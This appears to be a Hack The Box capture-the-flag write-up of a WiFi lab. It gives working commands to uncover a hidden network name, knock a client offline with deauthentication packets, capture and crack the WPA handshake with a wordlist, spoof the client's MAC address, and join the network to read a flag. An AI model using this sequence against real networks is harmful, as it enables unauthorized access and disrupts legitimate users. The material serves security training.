### What is the name of the WiFi network with the BSSID D8:D6:3D:EB:29:D5?

Start monitor mode

![](Screenshot%202026-09-17%20at%2013.28.42.png)

Scan available WiFi using the command 

```sh
sudo airodump-ng wlan0mon
```

![](Screenshot%202026-09-17%20at%2013.30.49.png)

Because the ESSID is hidden so, we gonna use this command to reveal it

```sh
sudo mdk3 wlan0mon p -b u -c 1 -t D8:D6:3D:EB:29:D5
```

![](Screenshot%202026-09-17%20at%2013.46.46.png)
### What is the password for the WiFi network with the BSSID D8:D6:3D:EB:29:D5?

Run a monitoring

```sh
sudo airodump-ng --bssid D8:D6:3D:EB:29:D5 -c 1 -w capture wlan0mon
```


![](Screenshot%202026-09-17%20at%2013.52.27.png)

Client with MAC Address `02:00:00:00:02:00` is connecting on our HTB WiFi

Running the command to capture the network WPA/WPA2 Handshake

```sh
sudo airodump-ng --bssid D8:D6:3D:EB:29:D5 -c 1 -w capture wlan0mon
```

On a new terminal running the command

```sh
sudo aireplay-ng --deauth 10 -a D8:D6:3D:EB:29:D5 -c 02:00:00:00:02:00 wlan0mon
```

![](Screenshot%202026-09-17%20at%2013.57.04.png)

![](Screenshot%202026-09-17%20at%2013.56.43.png)![](Screenshot%202026-09-17%20at%2014.00.34.png)

We got the .pcap file, now brute-forcing by using wordlist

```sh
aircrack-ng -w wordlist.txt -b D8:D6:3D:EB:29:D5 capture-06.cap
```

![](Screenshot%202026-09-17%20at%2014.01.54.png)
### Connect to the WiFi network and submit the flag found at IP 192.168.1.1 or 192.168.2.1.

Stop the airmon-ng monitor

```sh
sudo airmon-ng stop wlan0mon
```

![](Screenshot%202026-09-17%20at%2014.03.48.png)

Change the interface MAC address to the MAC address that we found above `02:00:00:00:02:00`

```sh
sudo ifconfig wlan0 down
sudo macchanger wlan0 -m 02:00:00:00:02:00
sudo ifconfig wlan0 up
```

![](Screenshot%202026-09-17%20at%2014.12.04.png)

Connect to the WiFi with credentials `HTB:minecraft`

![](Screenshot%202026-09-17%20at%2014.13.55.png)

```sh
wget 192.168.1.1

cat index.html
```

![](Screenshot%202026-09-17%20at%2014.15.27.png)